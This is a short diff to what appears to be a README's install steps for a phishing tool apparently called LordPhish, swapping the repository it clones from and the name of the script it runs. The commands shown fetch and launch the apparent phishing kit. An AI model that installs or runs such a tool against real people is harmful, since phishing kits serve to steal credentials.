@@ -27,10 +27,10 @@ apt-get install php -y
 apt-get install openssh -y 
 apt-get install wget -y
 apt-get install git -y
-git clone https://github.com/Black-Hell-Team/LordPhish.git
-cd LordPhish
+git clone https://github.com/LeonardoModz/LORD
+cd LORD
 bash setup.sh 
-bash lord.sh
+bash LORD.sh
 ```
 
 ## Disclaimer :
